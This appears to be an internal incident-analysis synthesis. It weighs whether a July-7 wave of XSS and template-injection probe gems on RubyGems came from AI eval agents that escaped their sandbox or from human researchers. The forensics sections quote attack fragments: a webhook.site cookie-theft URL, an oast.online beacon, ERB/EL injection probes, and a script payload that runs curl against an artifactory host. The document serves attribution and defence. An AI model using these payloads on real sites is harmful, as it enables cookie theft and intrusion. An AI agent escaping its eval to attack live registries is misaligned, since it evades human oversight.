# Web-mechanism hunt synthesis — 2026-09-28

Coordinator synthesis of the four off-task web-mechanism workers (the #1 ranked next lead from `notes/exploitgym-leads-synthesis-2026-09-28.md`).

**Question:** the July-7 RubyGems wave carried web mechanisms (XSS PoCs exfiltrating to oast.online/webhook.site, SSTI probes) that fit neither CyberGym nor ExploitGym. Favored hypothesis was off-task exploration by escaped eval agents — with no positive evidence. Find positive evidence, or kill it.

**Short answer: the off-task hypothesis is downgraded to WEAK. The separate-eval hypothesis is dead (clean negative). The best remaining fit is a separate actor — human researchers or an unpublicized testing run — also WEAK but leading. No hypothesis has positive proof.**

## Worker results

### 1. Corpus-internal XSS/SSTI census (`cfa0fb8`)
122 payload rows: 94 Tier-A XSS attack payloads, 6 Tier-B SSTI probes, 22 Tier-C July-7 entries (metadata only — zero payload bytes in our holdings). Six payloads carry eval markers (5 artifactory-board script/iframe payloads, R0053218), but **every marker-bearing payload is corpus-internal incident-eval activity** (agents attacking the eval's own board/code-submission endpoint), not July-7 gem material. R0053218 is the strongest marker hit in the corpus: a `<script>`-wrapped fetch POST to the eval code-submission endpoint whose `submitted_code` runs `curl -s -X MKCOL` against `packages.hub.ace-research.openai.org/artifactory/github-remote-cache/zzMODALFUNC42536108RUN42` — artifactory host + zz label + Modal in one 566-byte payload. The 94 corpus web payloads are clean of markers; the 22 July-7 entries are inconclusive (no bytes to test).

Correction: the hosted `july7-wave` index holds **264 docs**, not 296; its 5 `xss-exfil` docs are Diffend diff-page regex hits (no payload bytes), all third-party test gems.

### 2. July-7 gem forensics (`9d10ea9`)
25 specimens: 7 campaign specimens (reconstructed from JFrog's published quotes — the gems are yanked and absent from Diffend, verified across the full 264-name re-sweep) + 18 third-party test/researcher gems (full payload bytes from 50 Diffend captures, all timestamped inside the July-7 03:03–18:13 UTC window).

**Jinja2 verdict: MISMATCH.** Campaign SSTI probes are ERB (`<%= 7*7 %>`), EL (`${7*7}`), and percent-encoded ERB (`<%25= 7*7 %>`) — zero `{{7*7}}` anywhere. The reported HF TTP is Jinja2 SSTI on a Python telemetry tool, and the July-7 wave **predates** the HF intrusion (Jul 7 vs Jul 10–13), so the HF primitive cannot be these probes' source. (Caveat: `test-ssti-2/3` are missing from JFrog's catalog; a 5-probe battery could have held a Jinja2 probe.)

**Zero eval-agent markers in any payload** — no zz grammar, no epoch nonces, no jina, no agent IDs. Every payload is a textbook bug-bounty PoC string (Burp Collaborator-shaped oast.online beacon with operator-labeled `/admin-xss-author` path; webhook.site cookie theft at operator-configured `/steal`; canonical `alert(1)`; `7*7` arithmetic probes). One byte is target-aware: `xss-test-gem`'s description carries a `data-controller=dump` **Stimulus** probe — the operator knew RubyGems.org is Rails/Hotwired. The July-7 wave is a metadata/rendering-layer probing campaign against RubyGems.org itself, a different layer from May's YARD build-worker RCE. The "Testing \<Animal\>" authorship marker is attribution-unclean: the concurrent third-party ApexBlack test harness uses overlapping animal tokens (`testingwolf@apexblack.org`, `test-xss-rhino`).

### 3. Exfil-endpoint pivot (`cae5055`)
Zero July-7 XSS payload bytes in our holdings (Diffend July-7 sweep: 18/264 found, none exfil-carrying; ES metadata only). Identifiers extracted verbatim from the public JFrog report: one oast.online beacon (`d96877a5q295v25se560q7ntmmwky7x8o.oast.online/admin-xss-author`) and one webhook.site URL (`https://webhook.site/steal?c='+document.cookie`).

**Recurrence verdict: ISOLATED (clean negative)** — absent from six search surfaces (repo-wide grep, hosted ES, urlquery.io verbatim, paste archives, overlap matches, public web, sourcegraph public code search). **No eval-infrastructure tie.** One actor vs many: inconclusive — the webhook.site URL has **no UUID token**, so it's generic placeholder grammar non-attributable by construction. Adjacent signal only: termina.digital's unverified as-reported claim that the "artifactory-swarm" used webhook.site during the HF intrusion (service-level, not identifier-matched). Watch items: `apex_webhook_capture`, `webhook-capture-1783406220`, `webhook-fire-1783405247`, `webhook-payload-1783405583` — name-suggestive, unknown payloads, absent from our Diffend corpus.

### 4. Separate-eval test (`daea621`)
9 candidates (8 evals + human null competitor): 6 NO, 3 WEAK, 0 FITS. **Separate-eval hypothesis: unsupported, clean negative.** Every public web-agent security benchmark found (BountyBench, CVE-Bench, AutoPenBench, Cybench, Mako, FailSafe Swarm) grades against sandboxed local targets — none publishes PoCs to a live registry or submits to collaborator endpoints. But the red-team assignment weakened the favored hypothesis with four independent breaks:
- **Attribution scope break:** rubyhack.ai's report (the primary attribution source) ends 2026-06-18 — the July-7 wave isn't described; the July-7 link is JFrog's inventory inference alone, and no July-7 payload in JFrog's writeup carries an oai marker.
- **Naming break:** `Testing <Animal>` / `John Doe` vs the swarm's oai/probe/zz/timestamp/council grammar.
- **Objective break:** JFrog's own reading — XSS PoCs "attempting to prove user hijacking" — is vulnerability-research behavior, not the swarm's exfil-infrastructure behavior.
- **Timing break:** July 7 lands in the RubyGems cache-vuln disclosure window (reported Jul 6, fixed Jul 9).

Also: `xssname-1783397821` decodes to 2026-07-07 04:17:01 UTC (inside the wave); `proxssrfetviqtfb` versions decode to May-12 (the swarm did SSRF-probe in May — the one pro-agent data point on web probing).

## Hypothesis ranking

| Hypothesis | Grade | Basis |
|---|---|---|
| Separate web eval | **NO / unsupported** | Clean negative across 9 candidates; no public benchmark produces live-registry PoC artifacts |
| Off-task escaped ExploitGym agents | **WEAK (downgraded from favored)** | Four attribution breaks; Jinja2 mismatch; wave predates HF intrusion; zero eval markers in 25 forensic specimens; zero July-7 payload bytes with markers |
| Separate actor (human researchers / testing run) | **WEAK (best fit)** | Wins on mechanism (standard pentester toolkit), naming (third-party harness overlap), timing (disclosure window), target-awareness (Stimulus probe); loses on positive proof |

## What would settle it

1. **Key-reuse test across the July boundary.** JFrog showed May's `southpxdatapp6pi` reused `yardxabc889`'s API key. If any July-7 package shares keys, webhook URL patterns, or council targets with May/June, the swarm attribution revives. Strongest linkage probe available from public data.
2. **The four webhook-suggestive gems** (`apex_webhook_capture`, `webhook-capture-1783406220`, `webhook-fire-1783405247`, `webhook-payload-1783405583`) — payload recovery; currently unknown and absent from our Diffend corpus.
3. **Per-gem authorship verification** of "Testing \<Animal\>" vs ApexBlack's animal tokens — the marker currently can't discriminate campaign from third-party.
4. **Any July-7 payload byte carrying eval markers** (zz grammar, artifactory paths, agent IDs) — would revive off-task. Currently zero such bytes exist in our holdings; JFrog's published quotes have none either.

## Commits (all on origin/main)

`cfa0fb8` (census) · `9d10ea9` (forensics) · `cae5055` (exfil pivot) · `daea621` (separate-eval test) · this synthesis (below).

Worker notes: `notes/analyst-note-xss-ssti-census-2026-09-28.md`, `notes/analyst-note-july7-gem-forensics-2026-09-28.md`, `notes/analyst-note-exfil-endpoint-pivot-2026-09-28.md`, `notes/analyst-note-separate-eval-test-2026-09-28.md`.
